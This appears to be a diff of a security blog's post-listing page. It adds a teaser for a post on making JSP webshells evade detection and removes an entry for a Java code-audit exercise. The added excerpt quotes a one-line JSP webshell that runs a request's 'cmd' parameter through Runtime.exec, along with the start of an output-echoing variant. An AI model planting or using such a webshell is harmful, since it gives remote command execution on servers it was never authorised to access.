@@ -137,6 +137,73 @@
   <div class="post-item">
     
     <div class="post-item-info">
+      <a class="post-title" href="/2022/04/22/bypassJsp/" title="Jsp Webshell免杀 ">
+        
+        Jsp Webshell免杀
+        
+      </a>
+      <div class="post-description">
+        
+        前言之前只会写最简单webshell，今天来不系统地学习一下Jsp的webshell的免杀方式一句话Webshell从一句话木马角度来说，最简单的应该是&amp;lt;%Runtime.getRuntime().exec(request.getParameter(&amp;quot;cmd&amp;quot;));%&amp;gt;直接调用了Runtime的exec方法，并且不进行回显，适用于反弹shell，但是就没法进行一些其他的操作，并且是个WAF都会拦如果说需要加上回显，应该写成如下&amp;lt;%@pageimport=&amp;quot;java.io.InputStream&amp;quot;%&amp;gt;&amp;lt;%@pageimport=&amp;quot;java.io.InputStreamReader&amp;quot;%&amp;gt;&amp;lt;%@pageimport=&amp;quot;java.io.BufferedReader&amp;quot;%&amp;gt;&amp;lt;%@pagelanguage=&amp;quot;java&amp;quot;pageEncoding=&amp;quot;UTF-8&amp;quot;%&amp;gt;&amp;lt;%Runtimert=Runtime.getRu...
+      </div>
+      <div class="post-meta-wrap">
+        <span class="post-meta-date">
+          <i class="far fa-calendar-alt"></i>
+          <span>发表于 </span>
+          <span>
+            2022-04-22
+          </span>
+        </span>
+        
+
+        
+        <span class="post-tag">
+          <i class="fa fa-tag"></i>
+          
+          <a href="/tags/web%E5%AE%89%E5%85%A8/">
+            web安全
+          </a>
+          
+          <i class="fas fa-angle-right"></i>
+          
+          
+          <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
+            代码审计
+          </a>
+          
+          <i class="fas fa-angle-right"></i>
+          
+          
+          <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
+            渗透测试
+          </a>
+          
+          <i class="fas fa-angle-right"></i>
+          
+          
+          <a href="/tags/Java%E5%AE%89%E5%85%A8/">
+            Java安全
+          </a>
+          
+          <i class="fas fa-angle-right"></i>
+          
+          
+          <a href="/tags/%E5%85%8D%E6%9D%80/">
+            免杀
+          </a>
+          
+          
+        </span>
+        
+      </div>
+    </div>
+
+  </div>
+  
+  
+  <div class="post-item">
+    
+    <div class="post-item-info">
       <a class="post-title" href="/2022/04/21/JavaRMI4/" title="Java中JNDI,RMI,LDAP那些事(四) ">
         
         Java中JNDI,RMI,LDAP那些事(四)
@@ -642,59 +709,6 @@
           
           <a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/">
             内存马
-          </a>
-          
-          
-        </span>
-        
-      </div>
-    </div>
-
-  </div>
-  
-  
-  <div class="post-item">
-    
-    <div class="post-item-info">
-      <a class="post-title" href="/2022/04/06/ls1/" title="Java代码审计练习(一) ">
-        
-        Java代码审计练习(一)
-        
-      </a>
-      <div class="post-description">
-        
-        前言摸了好几天的鱼，被早8折磨的死去活来，一但早8，整天没精神，今天还被体育课折磨到低血糖，想到自己这么菜，选择继续学习，晚上稍微看了一下SSM框架，感觉非常无聊，突然心血来潮想审几个程序练练手，就随手找了个程序，这个是炼石计划之50套JavaWeb代码审计实战漏洞挖掘的一个系统，我看到这个就选择这个了，懒得去找其他了，里面的具体内容也需要付费。。。囊中羞涩，没有选择加入99/年的知识星球，只能自己探索了百度云链接：链接：https://pan.baidu.com/s/11rDre4Q32wqn7gMRyEmIyw提取码：4nee我这里木有收广告费哦，只是懒得转存再分享我自己的了。这套程序用的是SpringBoot+springsecurity+mybatis搭建环境首先我们打开我们的PHPstudy，然后打开数据库服务，新建一个数据库为rbac，然后导入我们源码里的sql文件，并且打开文件里的src\main\resources\application.yml文件，修改我们对应的数据库配置即可然后就是运行程序审计前的信息搜集搭建完环境之后可以大体看一下他的结构，该程序是基于MV...
-      </div>
-      <div class="post-meta-wrap">
-        <span class="post-meta-date">
-          <i class="far fa-calendar-alt"></i>
-          <span>发表于 </span>
-          <span>
-            2022-04-06
-          </span>
-        </span>
-        
-
-        
-        <span class="post-tag">
-          <i class="fa fa-tag"></i>
-          
-          <a href="/tags/web%E5%AE%89%E5%85%A8/">
-            web安全
-          </a>
-          
-          <i class="fas fa-angle-right"></i>
-          
-          
-          <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
-            代码审计
-          </a>
-          
-          <i class="fas fa-angle-right"></i>
-          
-          
-          <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">
-            渗透测试
           </a>
           
           
